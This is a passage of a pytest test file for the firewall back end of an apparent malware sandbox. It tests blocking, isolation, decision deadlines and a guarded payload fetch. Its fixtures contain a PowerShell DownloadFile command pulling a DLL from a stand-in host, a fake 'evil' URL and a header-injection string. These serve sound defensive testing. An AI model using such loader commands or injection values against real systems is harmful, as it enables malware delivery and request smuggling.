@@ -1,0 +1,920 @@
+"""FIREWALL tab back end: the twelve routes, the readers, the decisions, the guarded fetch and the capture store.
+
+The Windows firewall, the network and the event logs are fakes (``fw`` in conftest.py); what is tested is the
+wiring: what a route refuses, what a decision does to the firewall and to the fetch, and that a fetch only
+ever goes to the address that was observed.
+"""
+
+import os
+import re
+import time
+from datetime import datetime, timezone
+
+import pytest
+
+import firewall
+import geoip
+
+IMAGE = r"C:\x\loader.exe"
+URL = "http://203.0.113.50:8080/stage2.dll"
+FINDING = {"id": "dl-abc123", "pid": 4812, "image": IMAGE, "url": URL, "dst_ip": "203.0.113.50", "dst_port": 8080,
+           "source": "powershell", "observed_at": "2026-11-16T10:00:00.000Z", "origin_pid": 4812,
+           "requested_by": None, "in_detonation": True, "self": False}
+FIXTURE_DIR = os.path.join(os.path.dirname(__file__), "samples", "geoip")
+
+
+def iso(t=0.0):
+    return datetime.fromtimestamp(time.time() + t, timezone.utc).isoformat()
+
+
+def conn(dst="203.0.113.50", port=8080, pid=4812, image=IMAGE, t=-5.0, host="-"):
+    return {"timestamp": iso(t), "event_id": 3, "pid": str(pid), "image": image, "type": "NetworkConnect",
+            "dst_ip": dst, "dst_port": str(port), "dst_hostname": host, "protocol": "tcp",
+            "src_ip": "10.0.2.15", "src_port": "51000"}
+
+
+def script(url=URL, pid=4812, text=None, t=-4.0):
+    return {"time": iso(t), "source": "powershell", "message": text or f"(New-Object Net.WebClient).DownloadFile('{url}','a.dll')",
+            "fields": {"event_id": 4104, "record_id": 1, "pid": pid}}
+
+
+def seed(fw, url=URL, dst="203.0.113.50", port=8080, image=IMAGE, pid=4812, text=None):
+    fw.store.add_connections([conn(dst, port, pid, image)])
+    fw.store.add_powershell([script(url, pid, text)])
+
+
+def open_window(monkeypatch, tdc, pid=4812):
+    monkeypatch.setattr(tdc, "_firewall_open_windows", lambda now=None: {pid: "sub1"})
+
+
+def sweep(tdc):
+    tdc._firewall_sweep(now=time.time())
+
+
+# ---- the routes of the brief -----------------------------------------------------------------
+
+
+def test_connections_returns_tagged_flows(client, fw):
+    fw.store.add_connections([conn()])
+    r = client.get("/api/firewall/connections?max=50")
+    assert r.status_code == 200
+    assert isinstance(r.json["connections"], list)
+    assert set(r.json["connections"][0]) >= {"image", "dst_ip", "dst_port", "tags", "geo", "state"}
+
+
+def test_decide_takes_no_url(client, fw):
+    r = client.post("/api/firewall/decide", json={"url": "http://evil/x.exe", "action": "block_fetch"})
+    assert r.status_code == 400
+    assert fw.fetches == []
+
+
+def test_decide_with_an_unknown_id_touches_no_network(client, fw):
+    r = client.post("/api/firewall/decide", json={"id": "nope", "action": "block_fetch"})
+    assert r.status_code == 404 and fw.fetches == []
+
+
+def test_decide_works_exactly_once(client, fw):
+    pid = fw.pending.add(FINDING, deadline=time.time() + 30)["id"]
+    first = client.post("/api/firewall/decide", json={"id": pid, "action": "block_fetch"})
+    second = client.post("/api/firewall/decide", json={"id": pid, "action": "allow"})
+    assert first.status_code == 200 and second.status_code == 200
+    assert second.json["action"] == "block_fetch"
+    assert len(fw.fetches) == 1
+    assert first.json["won"] is True and second.json["won"] is False
+
+
+def test_fetch_refuses_a_different_destination(client, fw, tdc):
+    fw.resolve_to = "9.9.9.9"                    # DNS would point elsewhere now
+    out = tdc._fetch_capture({**FINDING, "dst_ip": "1.2.3.4"})
+    assert out["error"] and fw.fetches == []
+
+
+def test_fetch_stops_at_the_size_limit(client, fw, tdc):
+    fw.body = b"A" * (tdc.FETCH_MAX_BYTES + 1)
+    out = tdc._fetch_capture(FINDING)
+    assert out["error"] == "too large" and out.get("sha256") is None
+    assert not [p for _, _, files in os.walk(fw.samples) for p in files]       # nothing stays behind
+
+
+def test_a_capture_is_recorded_and_never_marked_executed(client, fw, tdc):
+    fw.body = b"MZ" + b"\x00" * 100
+    out = tdc._fetch_capture(FINDING)
+    rec = client.get("/api/firewall/captures").json["captures"][0]
+    assert rec["sha256"] == out["sha256"] and rec["magic"] == "MZ"
+    assert rec["executed"] is False
+
+
+def test_expired_decisions_are_fetched_without_a_browser(client, fw, tdc):
+    fw.pending.add(FINDING, deadline=time.time() - 1)
+    tdc._firewall_sweep(now=time.time())
+    assert len(fw.fetches) == 1
+    assert fw.pending.open() == []
+
+
+def test_ask_off_neither_blocks_nor_fetches(client, fw, tdc):
+    client.post("/api/firewall/ask", json={"mode": "off"})
+    fw.pending.add(FINDING, deadline=time.time() - 1)
+    tdc._firewall_sweep(now=time.time())
+    assert fw.fetches == [] and fw.run.calls == []
+
+
+def test_isolate_refuses_when_the_firewall_is_off(client, fw):
+    fw.profiles = {"Domain": False, "Private": False, "Public": False}
+    r = client.post("/api/firewall/isolate", json={"on": True})
+    assert r.status_code == 409 and "firewall" in r.json["error"].lower()
+
+
+def test_tool_updates_refuse_in_isolated(client, fw, tdc, monkeypatch, tmp_path):
+    import tool_updates
+    from test_tool_updates import FakeEnv
+    manager = tool_updates.UpdateManager(FakeEnv(), str(tmp_path / "s.json"), str(tmp_path / "u.log"),
+                                         str(tmp_path / "scripts"), preconditions=tdc._update_preconditions,
+                                         spawn=lambda work: None)
+    monkeypatch.setattr(tdc, "_update_manager", manager)
+    assert client.post("/api/firewall/isolate", json={"on": True}).status_code == 200
+    apply = client.post("/api/updates/apply", json={"tools": "all"})
+    check = client.post("/api/updates/check")
+    assert apply.status_code == 409 and "isolated" in apply.json["error"].lower()
+    assert check.status_code == 409 and "isolated" in check.json["error"].lower()
+    assert manager.snapshot()["mode"] == "idle"
+    client.post("/api/firewall/isolate", json={"on": False})
+    assert client.post("/api/updates/check").status_code == 202
+
+
+def test_the_daily_check_pauses_while_isolated(fw, tdc, monkeypatch):
+    calls = []
+
+    class Manager:
+        def snapshot(self):
+            return {"mode": "idle"}
+
+        def start_check(self):
+            calls.append("check")
+
+    monkeypatch.setattr(tdc, "_get_update_manager", lambda: Manager())
+    fw.settings.set(isolated=True)
+    tdc._update_check_loop(1, sleep=lambda s: None, rounds=1)
+    assert calls == []
+    fw.settings.set(isolated=False)
+    tdc._update_check_loop(1, sleep=lambda s: None, rounds=1)
+    assert calls == ["check"]
+
+
+def test_block_and_unblock_round_trip(client, fw):
+    r = client.post("/api/firewall/block", json={"scope": "endpoint", "ip": "1.2.3.4",
+                                                 "port": 443, "protocol": "tcp", "image": IMAGE})
+    rule_id = r.json["rule_id"]
+    assert client.get("/api/firewall/rules").json["rules"][0]["rule_id"] == rule_id
+    assert client.post("/api/firewall/unblock", json={"rule_id": rule_id}).status_code == 200
+    assert client.get("/api/firewall/rules").json["rules"] == []
+
+
+def test_every_action_is_written_to_the_access_log(client, fw):
+    client.post("/api/firewall/block", json={"scope": "process", "image": IMAGE})
+    hits = client.get('/api/logs/search?q=path="/api/firewall/block"').json
+    assert hits["count"] >= 1
+
+
+@pytest.mark.parametrize("path, poll", [("/api/firewall/pending", True), ("/api/firewall/connections", True),
+                                        ("/api/firewall/rules", False), ("/api/firewall/captures", False)])
+def test_only_the_polls_are_marked_as_polls(client, fw, tdc, path, poll):
+    client.get(path)
+    events = [e for e in tdc._logs.snapshot() if e["source"] == "access" and e["fields"]["path"] == path]
+    assert events[0]["fields"]["poll"] is poll
+
+
+@pytest.mark.parametrize("path, body", [
+    ("/api/firewall/block", {"scope": "process", "image": IMAGE}),
+    ("/api/firewall/ask", {"mode": "all"}),
+    ("/api/firewall/isolate", {"on": True}),
+    ("/api/firewall/decide", {"id": "x", "action": "allow"}),
+    ("/api/firewall/unblock", {"rule_id": "TDC-FW-000000000000"}),
+])
+def test_the_action_routes_are_not_poll_paths(client, fw, tdc, path, body):
+    client.post(path, json=body)
+    event = [e for e in tdc._logs.snapshot() if e["fields"].get("path") == path][0]
+    assert event["fields"]["poll"] is False
+
+
+# ---- geo -------------------------------------------------------------------------------------
+
+
+@pytest.fixture
+def geo_loaded(tmp_path):
+    geoip.build_index(FIXTURE_DIR, str(tmp_path))
+    with open(os.path.join(FIXTURE_DIR, "countries.tsv"), encoding="utf-8") as src, \
+            open(tmp_path / "countries.tsv", "w", encoding="utf-8") as dst:
+        dst.write(src.read())
+    geoip.load(str(tmp_path))
+    yield
+    geoip.load(str(tmp_path / "nothing"))
+
+
+def test_geo_carries_country_and_asn_when_data_is_loaded(client, fw, geo_loaded):
+    fw.store.add_connections([conn(dst="8.8.8.8", port=443), conn(dst="10.0.0.9", port=445, pid=5)])
+    flows = {f["dst_ip"]: f for f in client.get("/api/firewall/connections").json["connections"]}
+    assert flows["8.8.8.8"]["geo"]["cc"] == "US" and flows["8.8.8.8"]["geo"]["asn"] == 15169
+    assert flows["8.8.8.8"]["geo"]["scope"] == "public"
+    assert flows["10.0.0.9"]["geo"]["scope"] == "local" and flows["10.0.0.9"]["geo"]["cc"] is None
+    assert client.get("/api/firewall/geo?ip=8.8.8.8").json["geo"]["cc"] == "US"
+
+
+def test_geo_without_data_is_scope_and_nulls_and_nothing_raises(client, fw, tmp_path):
+    geoip.load(str(tmp_path / "nothing"))
+    assert not geoip.available()
+    fw.store.add_connections([conn(dst="8.8.8.8", port=443)])
+    r = client.get("/api/firewall/connections")
+    assert r.status_code == 200
+    assert r.json["connections"][0]["geo"] == {"scope": "public", "cc": None, "country": None, "lat": None,
+                                               "lon": None, "asn": None, "as_org": None}
+    assert client.get("/api/firewall/geo?ip=8.8.8.8").status_code == 200
+    assert client.get("/api/firewall/summary").status_code == 200
+    assert client.get("/api/firewall/geo?ip=not-an-ip").status_code == 400
+
+
+def test_start_up_loads_the_geo_data_once(tdc, monkeypatch):
+    loaded = []
+    monkeypatch.setattr(tdc.geoip, "load", lambda *a: loaded.append(a))
+    monkeypatch.setattr(tdc, "_ensure_capture_dir", lambda *a: None)
+    monkeypatch.setattr(tdc.firewall_rules, "startup_state", lambda run, settings: {"announce": False})
+    monkeypatch.setattr(tdc, "_firewall_loop", lambda collector: None)
+    tdc._start_firewall().join(2)
+    assert loaded == [()]
+
+
+# ---- the decide route ------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize("body", [
+    {"id": "x", "action": "allow", "url": "http://evil/x"},
+    {"id": "x", "action": "allow", "extra": 1},
+    {"action": "allow"}, {"id": "x"}, {"id": 5, "action": "allow"}, {"id": "x", "action": "kill"},
+    {"id": "x", "action": ["allow"]}, [], "allow",
+])
+def test_decide_rejects_anything_but_an_id_and_an_action(client, fw, body):
+    fw.pending.add(FINDING, deadline=time.time() + 30)
+    assert client.post("/api/firewall/decide", json=body).status_code == 400
+    assert fw.fetches == [] and len(fw.pending.open()) == 1
+
+
+def test_decide_without_json_is_a_400(client, fw):
+    assert client.post("/api/firewall/decide", data="id=x", content_type="text/plain").status_code == 400
+
+
+def test_block_fetch_blocks_the_loader_and_keeps_the_fetcher_free(client, fw, tdc):
+    pid = fw.pending.add(FINDING, deadline=time.time() + 30)["id"]
+    out = client.post("/api/firewall/decide", json={"id": pid, "action": "block_fetch"}).json
+    assert out["item"]["result"]["block"]["verified"] is True
+    assert out["item"]["result"]["fetch"]["sha256"]
+    (rule,) = [r for r in client.get("/api/firewall/rules").json["rules"]]
+    assert rule["image"].lower() == IMAGE.lower() and rule["ip"] == "203.0.113.50" and rule["blocking"]
+    assert rule["port"] is None
+
+
+def test_allow_removes_the_block_when_nothing_else_holds_the_endpoint(client, fw):
+    client.post("/api/firewall/block", json={"scope": "endpoint", "ip": "203.0.113.50", "image": IMAGE})
+    pid = fw.pending.add(FINDING, deadline=time.time() + 30)["id"]
+    out = client.post("/api/firewall/decide", json={"id": pid, "action": "allow"}).json
+    assert out["item"]["result"]["unblocked"] is True
+    assert client.get("/api/firewall/rules").json["rules"] == [] and fw.fetches == []
+
+
+def test_two_decisions_for_one_endpoint_in_opposite_directions_keep_it_blocked_until_none_holds_it(client, fw):
+    a = fw.pending.add(FINDING, deadline=time.time() + 30)["id"]
+    b = fw.pending.add({**FINDING, "id": "dl-b", "url": URL + "?b"}, deadline=time.time() + 30)["id"]
+    first = client.post("/api/firewall/decide", json={"id": a, "action": "allow"}).json
+    assert first["item"]["result"]["unblocked"] is False                    # b is still open
+    client.post("/api/firewall/decide", json={"id": b, "action": "block"})
+    assert len(client.get("/api/firewall/rules").json["rules"]) == 1
+    c = fw.pending.add({**FINDING, "id": "dl-c", "url": URL + "?c"}, deadline=time.time() + 30)["id"]
+    client.post("/api/firewall/decide", json={"id": c, "action": "allow"})
+    assert len(client.get("/api/firewall/rules").json["rules"]) == 1        # b decided block: still held
+
+
+def test_an_address_wide_block_refuses_block_fetch_and_keeps_the_id(client, fw):
+    client.post("/api/firewall/block", json={"scope": "endpoint_all", "ip": "203.0.113.50"})
+    pid = fw.pending.add(FINDING, deadline=time.time() + 30)["id"]
+    r = client.post("/api/firewall/decide", json={"id": pid, "action": "block_fetch"})
+    assert r.status_code == 409 and fw.fetches == []
+    assert client.post("/api/firewall/decide", json={"id": pid, "action": "block"}).status_code == 200
+
+
+def test_the_deadline_falls_back_to_block_only_under_an_address_wide_block(client, fw, tdc):
+    client.post("/api/firewall/block", json={"scope": "endpoint_all", "ip": "203.0.113.50"})
+    fw.pending.add(FINDING, deadline=time.time() - 1)
+    sweep(tdc)
+    assert fw.fetches == []
+    assert fw.pending.history(1)[0]["action"] == "block"
+
+
+def test_the_pending_route_lists_open_and_decided_with_the_time_left(client, fw):
+    fw.pending.add(FINDING, deadline=time.time() + 30)
+    fw.pending.add({**FINDING, "id": "dl-done"}, deadline=time.time() + 30)
+    client.post("/api/firewall/decide", json={"id": "dl-done", "action": "block"})
+    out = client.get("/api/firewall/pending").json
+    assert [i["id"] for i in out["pending"]] == ["dl-abc123"] and 0 < out["pending"][0]["remaining"] <= 30
+    assert out["pending"][0]["deadline"].endswith("Z")
+    assert [i["id"] for i in out["history"]] == ["dl-done"] and out["history"][0]["result"]["by"] == "analyst"
+    assert out["ask_mode"] == "detonation"
+
+
+def test_a_fetch_that_finishes_after_its_item_was_pruned_still_keeps_the_capture(client, fw, tdc, monkeypatch):
+    fw.pending.add(FINDING, deadline=time.time() + 30)
+    monkeypatch.setattr(fw.pending, "set_result", lambda *a, **k: None)
+    tdc._fw_fetch_item("dl-abc123")
+    assert len(client.get("/api/firewall/captures").json["captures"]) == 1
+
+
+# ---- ask, isolate, block ---------------------------------------------------------------------
+
+
+def test_ask_sets_the_mode_and_refuses_junk(client, fw):
+    assert client.post("/api/firewall/ask", json={"mode": "all"}).json == {"ask_mode": "all"}
+    assert fw.settings.ask_mode == "all"
+    for body in ({"mode": "never"}, {"mode": "all", "x": 1}, {}, {"mode": ["all"]}):
+        assert client.post("/api/firewall/ask", json=body).status_code == 400
+    assert fw.settings.ask_mode == "all"
+
+
+def test_isolate_state_and_switch(client, fw):
+    state = client.get("/api/firewall/isolate").json
+    assert state["isolated"] is False and state["profiles_off"] == []
+    on = client.post("/api/firewall/isolate", json={"on": True})
+    assert on.status_code == 200 and on.json["isolated"] is True and on.json["state"]["isolated"] is True
+    assert fw.settings.isolated and fw.settings.outbound_before == "Allow"
+    off = client.post("/api/firewall/isolate", json={"on": False})
+    assert off.json["isolated"] is False and not fw.settings.isolated
+    assert client.post("/api/firewall/isolate", json={"on": "yes"}).status_code == 400
+
+
+def test_the_fetcher_is_the_program_isolated_allows(client, fw, tdc):
+    client.post("/api/firewall/isolate", json={"on": True})
+    assert any("-Program " + tdc._fw_fetcher_path() in " ".join(c) and "-Action Allow" in " ".join(c)
+               for c in fw.run.calls)
+    # and the fetcher cannot be blocked
+    r = client.post("/api/firewall/block", json={"scope": "process", "image": tdc._fw_fetcher_path()})
+    assert r.status_code == 409
+
+
+@pytest.mark.parametrize("body", [
+    {"scope": "world", "image": IMAGE}, {"scope": "process"}, {"scope": "process", "image": IMAGE, "ip": "1.2.3.4"},
+    {"scope": "endpoint", "ip": "1.2.3.4"}, {"scope": "endpoint", "image": IMAGE},
+    {"scope": "endpoint_all", "ip": "1.2.3.4", "image": IMAGE}, {"scope": "endpoint_all"},
+    {"scope": "endpoint", "image": IMAGE, "ip": "1.2.3.4", "port": "443"},
+    {"scope": "endpoint", "image": IMAGE, "ip": "1.2.3.4", "port": True},
+    {"scope": "process", "image": IMAGE, "bogus": 1}, {"image": IMAGE},
+])
+def test_block_refuses_a_malformed_request_before_it_touches_the_firewall(client, fw, body):
+    assert client.post("/api/firewall/block", json=body).status_code == 400
+    assert fw.run.calls == []
+
+
+def test_block_on_the_loopback_for_everyone_is_refused(client, fw):
+    r = client.post("/api/firewall/block", json={"scope": "endpoint_all", "ip": "127.0.0.1"})
+    assert r.status_code == 409 and "loopback" in r.json["error"].lower() and fw.run.rules == {}
+
+
+def test_block_refuses_while_the_firewall_is_off(client, fw):
+    fw.profiles = {"Domain": True, "Private": False, "Public": True}
+    r = client.post("/api/firewall/block", json={"scope": "process", "image": IMAGE})
+    assert r.status_code == 409 and "firewall" in r.json["error"].lower()
+    assert fw.run.rules == {}
+
+
+def test_block_that_cannot_be_verified_is_not_a_success(client, fw, monkeypatch):
+    monkeypatch.setattr(fw.run, "disable_new", True)
+    r = client.post("/api/firewall/block", json={"scope": "process", "image": IMAGE})
+    assert r.status_code == 409 and r.json["verified"] is False and r.json["error"]
+
+
+def test_unblock_removes_every_rule_of_a_key(client, fw):
+    a = client.post("/api/firewall/block", json={"scope": "endpoint", "ip": "1.2.3.4", "port": 443,
+                                                 "protocol": "tcp", "image": IMAGE}).json["rule_id"]
+    b = client.post("/api/firewall/block", json={"scope": "endpoint", "ip": "1.2.3.4", "port": 443,
+                                                 "protocol": "udp", "image": IMAGE}).json["rule_id"]
+    rules = client.get("/api/firewall/rules").json["rules"]
+    assert {r["rule_id"] for r in rules} == {a, b} and rules[0]["key"] == rules[1]["key"]
+    assert set(client.post("/api/firewall/unblock", json={"rule_id": a}).json["removed"]) == {a, b}
+    assert client.get("/api/firewall/rules").json["rules"] == []
+
+
+@pytest.mark.parametrize("body", [{}, {"rule_id": 3}, {"rule_id": "x", "y": 1}, {"rule_id": "Core Networking"},
+                                  {"rule_id": "TDC-FW-*"}])
+def test_unblock_takes_only_our_rule_ids(client, fw, body):
+    assert client.post("/api/firewall/unblock", json=body).status_code == 400
+
+
+def test_a_blocked_flow_shows_as_blocked(client, fw):
+    fw.store.add_connections([conn()])
+    assert client.get("/api/firewall/connections").json["connections"][0]["state"] == "allowed"
+    client.post("/api/firewall/block", json={"scope": "endpoint", "ip": "203.0.113.50", "image": IMAGE})
+    flow = client.get("/api/firewall/connections").json["connections"][0]
+    assert flow["state"] == "blocked" and flow["rule_id"].startswith("TDC-FW-")
+
+
+def test_connections_filters_and_the_cap(client, fw):
+    fw.store.add_connections([conn(dst=f"203.0.113.{i}", port=4444, pid=i + 10) for i in range(1, 6)]
+                             + [conn(dst="198.51.100.7", port=443, image=r"C:\y\edge.exe", pid=99)])
+    assert client.get("/api/firewall/connections?max=2").json["truncated"] is True
+    assert len(client.get("/api/firewall/connections?max=2").json["connections"]) == 2
+    assert client.get("/api/firewall/connections?process=edge").json["count"] == 1
+    assert client.get("/api/firewall/connections?tag=rare-port").json["count"] == 5
+    assert client.get("/api/firewall/connections?state=blocked").json["count"] == 0
+    assert client.get("/api/firewall/connections?state=bad").status_code == 400
+    assert client.get("/api/firewall/connections?since=junk").status_code == 400
+    assert client.get("/api/firewall/connections?until=2001-01-01T00:00:00Z").json["count"] == 0
+
+
+def test_connections_still_answer_when_the_rules_cannot_be_read(client, fw, tdc, monkeypatch):
+    monkeypatch.setattr(tdc, "_fw_runner", lambda args: (1, "", "powershell is gone"))
+    fw.store.add_connections([conn()])
+    out = client.get("/api/firewall/connections").json
+    assert out["count"] == 1 and out["rules_error"]
+    assert client.get("/api/firewall/rules").status_code == 500
+
+
+def test_the_summary_counts(client, fw):
+    fw.store.add_connections([conn(), conn(dst="198.51.100.7", port=443, pid=7)])
+    out = client.get("/api/firewall/summary").json
+    assert out["connections"] == 2 and out["open_decisions"] == 0 and out["captures_total"] == 0
+    assert "bytes_note" in out and out["top_endpoints"]
+
+
+# ---- the sweep: what becomes a decision --------------------------------------------------------
+
+
+def test_a_download_in_a_detonation_is_blocked_first_and_asked_after(client, fw, tdc, monkeypatch):
+    seed(fw)
+    open_window(monkeypatch, tdc)
+    sweep(tdc)
+    (item,) = fw.pending.open()
+    assert item["finding"]["url"] == URL and item["result"]["block"]["verified"] is True
+    assert any("TDC-FW-" in n for n in fw.run.rules)
+    assert fw.fetches == []
+    sweep(tdc)
+    assert len(fw.pending.open()) == 1 and len(fw.run.rules) == 1               # no second decision, no second rule
+
+
+def test_decide_seconds_zero_fetches_at_once(client, fw, tdc, monkeypatch):
+    monkeypatch.setenv("TDC_FIREWALL_DECIDE_SECONDS", "0")
+    seed(fw)
+    open_window(monkeypatch, tdc)
+    sweep(tdc)
+    assert fw.pending.open() == [] and len(fw.fetches) == 1
+    assert fw.pending.history(1)[0]["result"]["by"] == "deadline"
+    assert client.get("/api/firewall/captures").json["captures"][0]["url"] == URL
+
+
+def test_detonation_mode_needs_a_detonation(client, fw, tdc):
+    seed(fw)
+    sweep(tdc)
+    assert fw.pending.open() == []
+
+
+def test_all_mode_takes_any_process_that_is_not_tdcs_own(client, fw, tdc):
+    client.post("/api/firewall/ask", json={"mode": "all"})
+    seed(fw)
+    seed(fw, url="http://198.51.100.9:8081/x.exe", dst="198.51.100.9", port=8081,
+         image=r"C:\DetonationChamberUI\venv\Scripts\python.exe", pid=77)
+    sweep(tdc)
+    assert [i["finding"]["dst_ip"] for i in fw.pending.open()] == ["203.0.113.50"]
+
+
+def test_off_marks_but_neither_asks_nor_blocks(client, fw, tdc, monkeypatch):
+    client.post("/api/firewall/ask", json={"mode": "off"})
+    seed(fw)
+    open_window(monkeypatch, tdc)
+    sweep(tdc)
+    assert fw.pending.open() == [] and fw.run.calls == []
+    flow = client.get("/api/firewall/connections").json["connections"][0]
+    assert "download" in flow["tags"]
+
+
+def test_an_update_cdn_is_marked_and_never_a_decision(client, fw, tdc, monkeypatch):
+    url = "http://download.windowsupdate.com:8080/msdownload/update/x.exe"
+    fw.store.add_dns([{"timestamp": iso(-6), "event_id": 22, "pid": "4812", "image": IMAGE,
+                       "query": "download.windowsupdate.com", "result": "203.0.113.60", "status": "0"}])
+    seed(fw, url=url, dst="203.0.113.60", port=8080)
+    open_window(monkeypatch, tdc)
+    sweep(tdc)
+    assert fw.pending.open() == [] and fw.run.calls == []
+    assert "download" in client.get("/api/firewall/connections").json["connections"][0]["tags"]
+
+
+def test_user_content_on_github_is_not_exempt():
+    assert not firewall.is_update_host("raw.githubusercontent.com")
+    assert not firewall.is_update_host("github.com")
+    assert firewall.is_update_host("a.b.download.windowsupdate.com")
+
+
+def test_what_the_web_ui_started_is_not_asked_about(client, fw, tdc, monkeypatch):
+    client.post("/api/firewall/ask", json={"mode": "all"})
+    fw.store.add_processes([{"timestamp": iso(-60), "event_id": 1, "pid": "4812", "image": r"C:\Windows\powershell.exe",
+                             "commandline": "update", "parent_pid": str(os.getpid()), "parent_image": "python.exe"}])
+    seed(fw)
+    sweep(tdc)
+    assert fw.pending.open() == []
+
+
+def test_an_old_finding_is_marked_but_no_longer_asked(client, fw, tdc, monkeypatch):
+    fw.store.add_connections([conn(t=-7200)])
+    fw.store.add_powershell([script(t=-7190)])
+    open_window(monkeypatch, tdc)
+    sweep(tdc)
+    assert fw.pending.open() == []
+    assert (4812, "203.0.113.50", 8080) in tdc._fw_downloads
+
+
+def test_a_second_sweep_cannot_ask_again_for_a_decided_finding(client, fw, tdc, monkeypatch):
+    monkeypatch.setenv("TDC_FIREWALL_DECIDE_SECONDS", "0")
+    seed(fw)
+    open_window(monkeypatch, tdc)
+    sweep(tdc)
+    sweep(tdc)
+    assert len(fw.fetches) == 1
+
+
+def test_a_failing_scan_does_not_stop_the_expired_decisions(client, fw, tdc, monkeypatch):
+    monkeypatch.setattr(tdc, "_fw_scan_downloads", lambda now: 1 / 0)
+    fw.pending.add(FINDING, deadline=time.time() - 1)
+    sweep(tdc)
+    assert len(fw.fetches) == 1
+
+
+def test_the_decide_seconds_setting(monkeypatch, tdc):
+    for raw, want in (("45", 45.0), ("0", 0.0), ("nan", 30.0), ("inf", 30.0), ("-3", 30.0), ("junk", 30.0),
+                      ("999999", 3600.0)):
+        monkeypatch.setenv("TDC_FIREWALL_DECIDE_SECONDS", raw)
+        assert tdc._firewall_decide_seconds() == want
+    monkeypatch.delenv("TDC_FIREWALL_DECIDE_SECONDS")
+    assert tdc._firewall_decide_seconds() == 30.0
+
+
+# ---- detonation windows ----------------------------------------------------------------------
+
+
+def _sub(sub_id, pid, ago):
+    return {"id": sub_id, "agent_pid": pid, "timestamp": datetime.fromtimestamp(time.time() - ago).isoformat()}
+
+
+def test_only_open_detonation_windows_are_submission_pids(fw, tdc, monkeypatch):
+    now = time.time()
+    monkeypatch.setattr(tdc, "_load_submissions", lambda: [
+        _sub("old", 100, 7200),            # two hours ago, its process is gone
+        _sub("running", 200, 7200),        # old, but still running
+        _sub("fresh", 300, 20),            # a second ago, the process already ended
+        _sub("ended", 400, 600),
+    ])
+    monkeypatch.setattr(tdc, "_process_started_at", lambda pid: now - 7200 if pid == 200 else None)
+    assert tdc._firewall_open_windows(now) == {200: "running", 300: "fresh"}
+    monkeypatch.setattr(tdc, "_fw_windows_cache", (0.0, {}))
+    assert tdc._firewall_open_windows(now + 200) == {200: "running"}
+
+
+def test_a_window_stays_open_for_a_minute_after_its_process_ended(fw, tdc, monkeypatch):
+    now = time.time()
+    monkeypatch.setattr(tdc, "_load_submissions", lambda: [_sub("s", 200, 3600)])
+    alive = {"on": True}
+    monkeypatch.setattr(tdc, "_process_started_at", lambda pid: now - 3600 if alive["on"] else None)
+    assert 200 in tdc._firewall_open_windows(now)
+    alive["on"] = False
+    monkeypatch.setattr(tdc, "_fw_windows_cache", (0.0, {}))
+    assert 200 in tdc._firewall_open_windows(now + 30)
+    monkeypatch.setattr(tdc, "_fw_windows_cache", (0.0, {}))
+    assert tdc._firewall_open_windows(now + 90) == {}
+
+
+def test_a_reused_pid_is_not_the_submission(fw, tdc, monkeypatch):
+    now = time.time()
+    monkeypatch.setattr(tdc, "_load_submissions", lambda: [_sub("s", 200, 7200)])
+    monkeypatch.setattr(tdc, "_process_started_at", lambda pid: now - 10)       # started long after the submission
+    assert tdc._firewall_open_windows(now) == {}
+
+
+# ---- the fetch -------------------------------------------------------------------------------
+
+
+def test_a_fetch_connects_to_the_observed_address_and_resolves_nothing(fw, tdc):
+    out = tdc._fetch_capture({**FINDING, "url": "http://stage.example.net:8080/a.dll"})
+    assert out["sha256"] and fw.lookups == []
+    (call,) = fw.fetches
+    assert call["ip"] == "203.0.113.50" and call["port"] == 8080 and call["scheme"] == "http"
+    assert call["headers"]["Host"] == "stage.example.net:8080" and call["target"] == "/a.dll"
+
+
+def test_a_fetch_over_tls_names_the_host(fw, tdc):
+    out = tdc._fetch_capture({**FINDING, "url": "https://stage.example.net/a.dll?x=1", "dst_port": 443})
+    (call,) = fw.fetches
+    assert out["sha256"] and call["scheme"] == "https" and call["host"] == "stage.example.net"
+    assert call["port"] == 443 and call["target"] == "/a.dll?x=1" and call["headers"]["Host"] == "stage.example.net"
+
+
+def test_the_loaders_user_agent_is_sent_and_recorded(fw, tdc):
+    fw.store.add_powershell([script(text=f"$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent','EvilLoader/1.0');"
+                                         f"$w.DownloadFile('{URL}','a.dll')")])
+    out = tdc._fetch_capture(FINDING)
+    assert fw.fetches[0]["headers"]["User-Agent"] == "EvilLoader/1.0"
+    assert out["user_agent"] == "EvilLoader/1.0" and out["user_agent_source"] == "loader"
+
+
+def test_a_neutral_user_agent_when_the_loader_names_none(fw, tdc):
+    out = tdc._fetch_capture(FINDING)
+    assert out["user_agent"] == tdc.FETCH_DEFAULT_UA and out["user_agent_source"] == "default"
+    assert fw.fetches[0]["headers"]["User-Agent"] == tdc.FETCH_DEFAULT_UA
+
+
+@pytest.mark.parametrize("agent", ["Evil\r\nX-Injected: 1", "Ünicode/1", "a" * 400])
+def test_a_user_agent_that_could_split_a_header_is_not_used(fw, tdc, agent):
+    fw.store.add_powershell([script(text=f"Invoke-WebRequest '{URL}' -UserAgent '{agent}'")])
+    out = tdc._fetch_capture(FINDING)
+    assert out["user_agent_source"] == "default"
+
+
+def test_a_redirect_on_the_same_address_is_followed(fw, tdc):
+    fw.script = [(302, {"Location": "/real/a.dll"}, b"")]
+    out = tdc._fetch_capture({**FINDING, "url": "http://stage.example.net:8080/a.dll"})
+    assert out["sha256"] and out["redirects"] == 1
+    assert [c["target"] for c in fw.fetches] == ["/a.dll", "/real/a.dll"]
+    assert {c["ip"] for c in fw.fetches} == {"203.0.113.50"}
+
+
+def test_a_redirect_to_another_host_is_refused(fw, tdc):
+    fw.script = [(302, {"Location": "http://other.example.org:8080/a.dll"}, b"")]
+    out = tdc._fetch_capture({**FINDING, "url": "http://stage.example.net:8080/a.dll"})
+    assert "leaves the observed address" in out["error"] and len(fw.fetches) == 1 and fw.lookups == []
+
+
+def test_a_redirect_to_another_address_literal_is_refused(fw, tdc):
+    fw.script = [(301, {"Location": "http://198.51.100.1:8080/a.dll"}, b"")]
+    assert "error" in tdc._fetch_capture(FINDING) and len(fw.fetches) == 1
+
+
+def test_at_most_three_redirects(fw, tdc):
+    fw.script = [(302, {"Location": f"/{i}"}, b"") for i in range(5)]
+    out = tdc._fetch_capture({**FINDING, "url": "http://stage.example.net:8080/a.dll"})
+    assert out["error"] == "too many redirects" and len(fw.fetches) == 4
+
+
+@pytest.mark.parametrize("status", [403, 404, 500, 204])
+def test_an_answer_that_is_not_a_file_stores_nothing(fw, tdc, status):
+    fw.script = [(status, {}, b"nope")]
+    out = tdc._fetch_capture(FINDING)
